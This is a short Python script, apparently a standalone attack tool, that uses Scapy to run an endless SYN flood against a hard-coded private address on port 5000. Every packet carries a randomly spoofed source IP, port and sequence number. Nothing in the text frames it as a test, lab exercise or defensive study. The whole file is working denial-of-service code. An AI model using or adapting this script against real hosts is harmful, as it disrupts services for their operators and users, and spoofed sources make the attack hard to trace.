from scapy.all import IP, TCP
from scapy.sendrecv import send
import random

target_ip = "192.168.224.233"
target_port = 5000

def syn_flood():
    print(f"Starting SYN flood on {target_ip}:{target_port}")
    while True:
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 4294967295)

        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=seq)

        pkt = ip / tcp

        # Send packet
        send(pkt, verbose=False)

try:
    syn_flood()
except KeyboardInterrupt:
    print("\nStopped by user.")